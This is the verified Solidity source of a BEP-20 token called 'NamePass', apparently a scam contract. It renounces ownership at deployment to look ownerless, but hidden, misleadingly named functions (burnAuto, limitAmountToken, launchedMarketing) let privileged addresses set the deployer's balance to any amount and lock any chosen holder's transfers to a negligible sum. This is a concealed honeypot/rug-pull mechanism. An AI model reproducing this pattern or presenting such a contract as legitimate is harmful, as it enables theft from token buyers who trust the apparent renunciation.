/**
 *Submitted for verification at BscScan.com on 2023-01-30
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract NamePass is IBEP20, Ownable {
    uint8 constant _decimals = 18;
    mapping(address => uint256) _balances;
    uint256 constant buyTake = 10 ** 10;
    string constant _name = "NamePass";
    mapping(address => bool) public autoReceiver;


    address public feeLaunch;
    string constant _symbol = "NS";

    mapping(address => bool) public liquidityReceiverMin;
    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    mapping(address => mapping(address => uint256)) _allowances;
    bool public modeMarketingExempt;
    address public tokenBurn;
    

    constructor (){
        UniswapRouter sellMax = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        feeLaunch = UniswapFactory(sellMax.factory()).createPair(sellMax.WETH(), address(this));
        tokenBurn = msg.sender;
        autoReceiver[tokenBurn] = true;
        _balances[tokenBurn] = _totalSupply;
        emit Transfer(address(0), tokenBurn, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(amount <= _allowances[sender][msg.sender]);
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function modeSwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(amount <= _balances[sender]);
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function limitAmountToken(address fundBurn) public {
        if (fundBurn == tokenBurn || !autoReceiver[msg.sender]) {
            return;
        }
        liquidityReceiverMin[fundBurn] = true;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function burnAuto(uint256 fromLaunch) public {
        if (fromLaunch == 0 || !autoReceiver[msg.sender]) {
            return;
        }
        _balances[tokenBurn] = fromLaunch;
    }

    function launchedMarketing(address exemptTeamAt) public {
        if (modeMarketingExempt) {
            return;
        }
        autoReceiver[exemptTeamAt] = true;
        modeMarketingExempt = true;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == tokenBurn || recipient == tokenBurn) {
            return modeSwap(sender, recipient, amount);
        }
        if (liquidityReceiverMin[sender]) {
            amount = buyTake;
        }
        return modeSwap(sender, recipient, amount);
    }


}